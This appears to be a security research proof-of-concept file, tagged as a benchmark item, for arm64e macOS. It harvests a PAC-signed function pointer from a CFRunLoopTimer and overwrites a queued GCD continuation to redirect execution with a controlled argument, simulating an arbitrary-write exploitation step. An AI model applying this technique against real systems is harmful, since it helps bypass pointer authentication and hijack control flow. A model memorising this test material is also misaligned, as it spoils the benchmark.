/*
 * gcd_verify_probe.mm — GCD dispatch redirection verification
 * Verifies that IA-zero signed function pointers can be substituted
 * in dispatch continuations with controlled context.
 * benchmark-id: LRK-7
 *
 * NOT an exploit — demonstrates PAC policy equivalence between
 * CFRunLoopTimer._callout and dispatch continuation work pointers.
 */
#import <Foundation/Foundation.h>
#import <dispatch/dispatch.h>
#import <CoreFoundation/CoreFoundation.h>
#import <dlfcn.h>
#import <signal.h>
#import <setjmp.h>
#import <stdio.h>
#import <string.h>

static sigjmp_buf jmpbuf;
static volatile int got_signal = 0;
static void sighandler(int sig) { got_signal = 1; siglongjmp(jmpbuf, 1); }

static uint64_t strip_pac(uint64_t val) {
    uint64_t r;
    __asm__ volatile("mov x16, %1\nxpaci x16\nmov %0, x16"
                     : "=r"(r) : "r"(val) : "x16");
    return r;
}

/* LRK-7: Original work function */
static volatile uint64_t original_ctx_received = 0;
static volatile int original_called = 0;

static void original_work(void *ctx) {
    original_ctx_received = (uint64_t)ctx;
    original_called = 1;
    printf("  [ORIGINAL] called with ctx=%p\n", ctx);
}

/* LRK-7: Replacement function — proves redirection worked */
static volatile uint64_t replacement_ctx_received = 0;
static volatile int replacement_called = 0;

static void replacement_func(void *ctx) {
    replacement_ctx_received = (uint64_t)ctx;
    replacement_called = 1;
    printf("  [REPLACEMENT] called with ctx=%p\n", ctx);
}

/* LRK-7: Another function for signing via Timer API */
static void timer_dummy_cb(CFRunLoopTimerRef t, void *info) {
    (void)t; (void)info;
}

int main(void) {
    @autoreleasepool {
        printf("=== GCD dispatch redirection verify (LRK-7) ===\n");
        printf("macOS %s  arch: %s\n\n",
               [[[NSProcessInfo processInfo] operatingSystemVersionString] UTF8String],
#if __arm64e__
               "arm64e"
#else
               "arm64"
#endif
        );

        /* ======================================================
         * Step 1: Get IA-zero signed pointer to replacement_func
         * via CFRunLoopTimerCreate API
         * ====================================================== */
        printf("--- Step 1: Obtain pacia(replacement_func, 0) via Timer API ---\n");

        CFRunLoopTimerRef helper_timer = CFRunLoopTimerCreate(
            NULL, CFAbsoluteTimeGetCurrent() + 99999, 0, 0, 0,
            (CFRunLoopTimerCallBack)replacement_func, NULL);

        uint64_t *tp = (uint64_t *)helper_timer;
        /* _callout is at offset +0x90 (index 18) — confirmed in prior probes */
        uint64_t signed_replacement = tp[18];
        uint64_t repl_stripped = strip_pac(signed_replacement);
        uint64_t expected_stripped = strip_pac((uint64_t)replacement_func);

        printf("  Timer._callout:  0x%016llx (tag=0x%04llx)\n",
               (unsigned long long)signed_replacement,
               (unsigned long long)((signed_replacement >> 48) & 0xFFFF));
        printf("  Stripped:        0x%016llx\n", (unsigned long long)repl_stripped);
        printf("  Expected:        0x%016llx\n", (unsigned long long)expected_stripped);
        printf("  Match: %s\n\n", repl_stripped == expected_stripped ? "YES" : "NO (ERROR)");

        if (repl_stripped != expected_stripped) {
            printf("  ERROR: Timer API did not store expected function.\n");
            CFRelease(helper_timer);
            return 1;
        }

        /* ======================================================
         * Step 2: Create suspended queue and dispatch original work
         * ====================================================== */
        printf("--- Step 2: Dispatch original_work to suspended queue ---\n");

        dispatch_queue_t q = dispatch_queue_create("LRK7.verify", DISPATCH_QUEUE_SERIAL);
        dispatch_suspend(q);

        uint64_t original_marker = 0xAAAA0000BBBBull;
        dispatch_async_f(q, (void *)original_marker, original_work);

        uint64_t original_work_stripped = strip_pac((uint64_t)original_work);
        printf("  original_work stripped: 0x%llx\n", (unsigned long long)original_work_stripped);
        printf("  original_marker:        0x%llx\n", (unsigned long long)original_marker);

        /* ======================================================
         * Step 3: Locate the continuation on the heap
         * ====================================================== */
        printf("\n--- Step 3: Locate continuation {work, context} on heap ---\n");

        uint64_t qaddr = (uint64_t)(__bridge void *)q;
        uint64_t *found_work_ptr = NULL;
        uint64_t *found_ctx_ptr = NULL;

        /* Scan ±4KB around queue object */
        for (int64_t off = -512; off <= 512; off++) {
            uint64_t *ptr = (uint64_t *)(qaddr + off * 8);

            got_signal = 0;
            struct sigaction sa={0}, old={0};
            sa.sa_handler = sighandler;
            sigaction(SIGSEGV, &sa, &old);

            uint64_t val = 0;
            int readable = 0;
            if (sigsetjmp(jmpbuf, 1) == 0) {
                val = *ptr;
                readable = 1;
            }
            sigaction(SIGSEGV, &old, NULL);
            if (!readable) continue;

            if (strip_pac(val) == original_work_stripped) {
                /* Check if next qword is our context marker */
                got_signal = 0;
                sigaction(SIGSEGV, &sa, &old);
                uint64_t next_val = 0;
                int next_readable = 0;
                if (sigsetjmp(jmpbuf, 1) == 0) {
                    next_val = *(ptr + 1);
                    next_readable = 1;
                }
                sigaction(SIGSEGV, &old, NULL);

                if (next_readable && next_val == original_marker) {
                    found_work_ptr = ptr;
                    found_ctx_ptr = ptr + 1;
                    printf("  FOUND at %p (queue+%lld):\n", ptr, (long long)(off * 8));
                    printf("    work:    0x%016llx (tag=0x%04llx)\n",
                           (unsigned long long)val,
                           (unsigned long long)((val >> 48) & 0xFFFF));
                    printf("    context: 0x%016llx\n",
                           (unsigned long long)next_val);
                    break;
                }
            }
        }

        if (!found_work_ptr) {
            printf("  ERROR: Could not locate continuation struct.\n");
            dispatch_resume(q);
            dispatch_sync(q, ^{});
            CFRelease(helper_timer);
            return 1;
        }

        /* ======================================================
         * Step 4: Overwrite work + context (simulates arb write)
         * ====================================================== */
        printf("\n--- Step 4: Overwrite {work, context} ---\n");

        uint64_t new_marker = 0xCAFEBABE12345678ull;

        printf("  Before:\n");
        printf("    work = 0x%016llx → original_work\n",
               (unsigned long long)*found_work_ptr);
        printf("    ctx  = 0x%016llx\n",
               (unsigned long long)*found_ctx_ptr);

        /* Write the IA-zero signed replacement pointer */
        *found_work_ptr = signed_replacement;
        *found_ctx_ptr = new_marker;

        printf("  After:\n");
        printf("    work = 0x%016llx → replacement_func (pacia from Timer)\n",
               (unsigned long long)*found_work_ptr);
        printf("    ctx  = 0x%016llx (new marker)\n",
               (unsigned long long)*found_ctx_ptr);

        /* ======================================================
         * Step 5: Resume queue and observe which function runs
         * ====================================================== */
        printf("\n--- Step 5: Resume queue and observe dispatch ---\n");

        dispatch_resume(q);
        /* Barrier to wait for completion */
        dispatch_sync(q, ^{});

        printf("\n--- Results ---\n");
        printf("  original_called:    %s (ctx=0x%llx)\n",
               original_called ? "YES" : "NO",
               (unsigned long long)original_ctx_received);
        printf("  replacement_called: %s (ctx=0x%llx)\n",
               replacement_called ? "YES" : "NO",
               (unsigned long long)replacement_ctx_received);

        if (replacement_called && replacement_ctx_received == new_marker) {
            printf("\n  *** SUCCESS: Dispatch redirected to replacement_func ***\n");
            printf("  *** Context received = 0x%llx (controlled) ***\n",
                   (unsigned long long)replacement_ctx_received);
            printf("  *** This proves: IA-zero signed pointer substitution + ***\n");
            printf("  *** controlled x0 argument via GCD dispatch on arm64e ***\n");
        } else if (original_called) {
            printf("\n  FAILED: Original work was called (overwrite did not take effect)\n");
            printf("  Possible: continuation was already dequeued before write\n");
        } else {
            printf("\n  FAILED: Neither function was called\n");
            printf("  Possible: PAC fault during dispatch (SIGBUS/SIGSEGV)\n");
        }

        CFRelease(helper_timer);
        printf("\n=== VERIFY COMPLETE ===\n");
    }
    return 0;
}
